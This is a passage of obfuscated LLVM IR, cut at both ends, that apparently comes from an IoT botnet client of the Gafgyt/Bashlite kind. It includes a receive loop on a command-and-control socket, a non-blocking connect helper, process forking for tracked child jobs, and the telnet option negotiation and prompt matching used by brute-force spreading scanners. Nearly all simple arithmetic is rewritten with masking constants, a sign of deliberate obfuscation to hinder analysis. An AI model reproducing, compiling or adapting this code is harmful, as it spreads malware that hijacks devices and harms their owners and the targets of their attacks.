  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = add i64 %46, -8616457413487937102
  %48 = sub i64 %47, 1
  %49 = sub i64 %48, -8616457413487937102
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = add i64 %58, -3541663715494868570
  %60 = sub i64 %59, 1
  %61 = sub i64 %60, -3541663715494868570
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %78

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = add i64 %72, 558651169311754601
  %74 = sub i64 %73, 1
  %75 = sub i64 %74, 558651169311754601
  %76 = sub i64 %72, 1
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  store i8 0, i8* %77, align 1
  br label %43

; <label>:78:                                     ; preds = %67
  %79 = load i8*, i8** %6, align 8
  %80 = call i8* @strchr(i8* %79, i32 46) #10
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %6, align 8
  %84 = call i8* @strchr(i8* %83, i32 46) #10
  store i8 0, i8* %84, align 1
  br label %85

; <label>:85:                                     ; preds = %82, %78
  %86 = load i8*, i8** %3, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = call i8* @strcpy(i8* %86, i8* %87) #2
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  store i32 0, i32* %2, align 4
  br label %96

; <label>:91:                                     ; preds = %13
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:93:                                     ; preds = %8
  %94 = load i32, i32* %4, align 4
  %95 = call i32 @close(i32 %94)
  store i32 1, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %93, %85
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %22, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %24

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 %17, 1664109252
  %19 = add i32 %18, 1
  %20 = add i32 %19, 1664109252
  %21 = add nsw i32 %17, 1
  store i32 %20, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %16, %10
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:24:                                     ; preds = %5
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  %27 = load i32, i32* %1, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %21, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %26

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, 65
  %14 = sub i32 %12, %13
  %15 = add i32 %12, 65
  %16 = trunc i32 %14 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %5, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %5, align 4
  br label %6

; <label>:26:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %116

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %108, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %115

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0))
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %67 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 0
  %68 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %67) #2, !srcloc !2
  %69 = extractvalue { i64, i64* } %68, 0
  %70 = extractvalue { i64, i64* } %68, 1
  %71 = trunc i64 %69 to i32
  store i32 %71, i32* %14, align 4
  %72 = ptrtoint i64* %70 to i64
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %65
  %75 = load i32, i32* %5, align 4
  %76 = srem i32 %75, 64
  %77 = zext i32 %76 to i64
  %78 = shl i64 1, %77
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %80 = load i32, i32* %5, align 4
  %81 = sdiv i32 %80, 64
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 %82
  %84 = load i64, i64* %83, align 8
  %85 = xor i64 %84, -1
  %86 = xor i64 %78, -1
  %87 = xor i64 2549436238335707901, -1
  %88 = and i64 %85, 2549436238335707901
  %89 = and i64 %84, %87
  %90 = and i64 %86, 2549436238335707901
  %91 = and i64 %78, %87
  %92 = or i64 %88, %89
  %93 = or i64 %90, %91
  %94 = xor i64 %92, %93
  %95 = or i64 %85, %86
  %96 = xor i64 %95, -1
  %97 = or i64 2549436238335707901, %87
  %98 = and i64 %96, %97
  %99 = or i64 %94, %98
  %100 = or i64 %84, %78
  store i64 %99, i64* %83, align 8
  %101 = load i32, i32* %5, align 4
  %102 = sub i32 %101, -1412304336
  %103 = add i32 %102, 1
  %104 = add i32 %103, -1412304336
  %105 = add nsw i32 %101, 1
  %106 = call i32 @select(i32 %104, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %106, i32* %12, align 4
  %107 = icmp sle i32 %106, 0
  br i1 %107, label %108, label %114

; <label>:108:                                    ; preds = %74
  %109 = load i32, i32* %13, align 4
  %110 = sub i32 %109, -931036991
  %111 = add i32 %110, 1
  %112 = add i32 %111, -931036991
  %113 = add nsw i32 %109, 1
  store i32 %112, i32* %13, align 4
  br label %57

; <label>:114:                                    ; preds = %74
  br label %115

; <label>:115:                                    ; preds = %114, %57
  br label %116

; <label>:116:                                    ; preds = %115, %33
  store i32 0, i32* %18, align 4
  %117 = load i8*, i8** %6, align 8
  store i8* %117, i8** %17, align 8
  br label %118

; <label>:118:                                    ; preds = %139, %116
  %119 = load i32, i32* %7, align 4
  %120 = sub i32 %119, 261728572
  %121 = add i32 %120, -1
  %122 = add i32 %121, 261728572
  %123 = add nsw i32 %119, -1
  store i32 %122, i32* %7, align 4
  %124 = icmp sgt i32 %119, 1
  br i1 %124, label %125, label %144

; <label>:125:                                    ; preds = %118
  %126 = load i32, i32* @mainCommSock, align 4
  %127 = call i64 @recv(i32 %126, i8* %16, i64 1, i32 0)
  %128 = icmp ne i64 %127, 1
  br i1 %128, label %129, label %131

; <label>:129:                                    ; preds = %125
  %130 = load i8*, i8** %17, align 8
  store i8 0, i8* %130, align 1
  store i32 -1, i32* %4, align 4
  br label %147

; <label>:131:                                    ; preds = %125
  %132 = load i8, i8* %16, align 1
  %133 = load i8*, i8** %17, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %17, align 8
  store i8 %132, i8* %133, align 1
  %135 = load i8, i8* %16, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 10
  br i1 %137, label %138, label %139

; <label>:138:                                    ; preds = %131
  br label %144

; <label>:139:                                    ; preds = %131
  %140 = load i32, i32* %18, align 4
  %141 = sub i32 0, 1
  %142 = sub i32 %140, %141
  %143 = add nsw i32 %140, 1
  store i32 %142, i32* %18, align 4
  br label %118

; <label>:144:                                    ; preds = %138, %118
  %145 = load i8*, i8** %17, align 8
  store i8 0, i8* %145, align 1
  %146 = load i32, i32* %18, align 4
  store i32 %146, i32* %4, align 4
  br label %147

; <label>:147:                                    ; preds = %144, %129
  %148 = load i32, i32* %4, align 4
  ret i32 %148
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 4038556910651395615, -1
  %26 = and i64 %23, 4038556910651395615
  %27 = and i64 %22, %25
  %28 = and i64 %24, 4038556910651395615
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 4038556910651395615, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %124

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %112

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %110

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = add i32 %93, 1389469003
  %95 = add i32 %94, 1
  %96 = sub i32 %95, 1389469003
  %97 = add nsw i32 %93, 1
  %98 = call i32 @select(i32 %96, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %101 = load i32, i32* %6, align 4
  %102 = bitcast i32* %14 to i8*
  %103 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* %102, i32* %13) #2
  %104 = load i32, i32* %14, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %100
  store i32 0, i32* %5, align 4
  br label %124

; <label>:107:                                    ; preds = %100
  br label %109

; <label>:108:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %124

; <label>:109:                                    ; preds = %107
  br label %111

; <label>:110:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %124

; <label>:111:                                    ; preds = %109
  br label %112

; <label>:112:                                    ; preds = %111, %52
  %113 = load i32, i32* %6, align 4
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = sext i32 %114 to i64
  store i64 %115, i64* %15, align 8
  %116 = load i64, i64* %15, align 8
  %117 = xor i64 -2049, -1
  %118 = xor i64 %116, %117
  %119 = and i64 %118, %116
  %120 = and i64 %116, -2049
  store i64 %119, i64* %15, align 8
  %121 = load i32, i32* %6, align 4
  %122 = load i64, i64* %15, align 8
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i64 %122)
  store i32 1, i32* %5, align 4
  br label %124

; <label>:124:                                    ; preds = %112, %110, %108, %106, %51
  %125 = load i32, i32* %5, align 4
  ret i32 %125
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %64

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, %11
  %13 = sub i64 0, 1
  %14 = add i64 %12, %13
  %15 = sub i64 0, %14
  %16 = add i64 %11, 1
  store i64 %15, i64* @numpids, align 8
  %17 = load i64, i64* @numpids, align 8
  %18 = add i64 %17, -8804568607639400210
  %19 = add i64 %18, 1
  %20 = sub i64 %19, -8804568607639400210
  %21 = add i64 %17, 1
  %22 = mul i64 %20, 4
  %23 = call noalias i8* @malloc(i64 %22) #2
  %24 = bitcast i8* %23 to i32*
  store i32* %24, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %25

; <label>:25:                                     ; preds = %44, %10
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = load i64, i64* @numpids, align 8
  %29 = sub i64 %28, -7117449823189604341
  %30 = sub i64 %29, 1
  %31 = add i64 %30, -7117449823189604341
  %32 = sub i64 %28, 1
  %33 = icmp ult i64 %27, %31
  br i1 %33, label %34, label %51

; <label>:34:                                     ; preds = %25
  %35 = load i32*, i32** @pids, align 8
  %36 = load i32, i32* %4, align 4
  %37 = zext i32 %36 to i64
  %38 = getelementptr inbounds i32, i32* %35, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = load i32*, i32** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = zext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %40, i64 %42
  store i32 %39, i32* %43, align 4
  br label %44

; <label>:44:                                     ; preds = %34
  %45 = load i32, i32* %4, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, 1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add i32 %45, 1
  store i32 %49, i32* %4, align 4
  br label %25

; <label>:51:                                     ; preds = %25
  %52 = load i32, i32* %2, align 4
  %53 = load i32*, i32** %3, align 8
  %54 = load i64, i64* @numpids, align 8
  %55 = add i64 %54, 1251425661193086795
  %56 = sub i64 %55, 1
  %57 = sub i64 %56, 1251425661193086795
  %58 = sub i64 %54, 1
  %59 = getelementptr inbounds i32, i32* %53, i64 %57
  store i32 %52, i32* %59, align 4
  %60 = load i32*, i32** @pids, align 8
  %61 = bitcast i32* %60 to i8*
  call void @free(i8* %61) #2
  %62 = load i32*, i32** %3, align 8
  store i32* %62, i32** @pids, align 8
  %63 = load i32, i32* %2, align 4
  store i32 %63, i32* %1, align 4
  br label %64

; <label>:64:                                     ; preds = %51, %8
  %65 = load i32, i32* %1, align 4
  ret i32 %65
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %111, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %117

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %84, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %82

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
